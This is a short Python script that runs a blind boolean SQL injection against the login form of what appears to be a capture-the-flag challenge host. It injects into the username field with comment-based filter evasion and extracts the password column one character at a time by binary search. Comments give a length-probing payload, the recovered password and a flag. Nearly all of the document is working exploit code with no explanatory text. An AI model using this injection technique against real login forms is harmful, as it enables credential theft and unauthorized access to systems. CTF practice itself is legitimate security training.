import requests
import binascii
 
payload_list = []
for _p in range(20,127):
	payload_list.append(binascii.b2a_hex(binascii.b2a_hex(chr(_p)).upper()))
payload_list.sort()
print payload_list
passwd = ""
for i in range(1,3333):
	_p = payload_list
	while True:
		cur = len(_p)/2
		data = {
			"submit": "login",
			"uname": "wuyanzu'&&/**/hex(hex(mid(/**/(passwd)from("+str(i)+")for(1)/**/)))<"+str(_p[cur])+"#",
			"passwd": "123"
		}
		res = requests.post("http://1bb2148346de430688fed4a8e0456eac142975aa583f46c5.game.ichunqiu.com/sql.php", data=data).text
		if 'passwd error' in res:
			_p = _p[:cur]
		else:
			_p = _p[cur:]
 
		if len(_p) == 1:
			passwd += binascii.a2b_hex(binascii.a2b_hex(str(_p[0])))
			print passwd
			break
#uname=admin'%26%26/**/length(passwd)<9%23&passwd=a&submit=login
 
#admin123
 
#flag{ecf5b34c-78ac-4ca4-b8ca-26e55f0f8270}
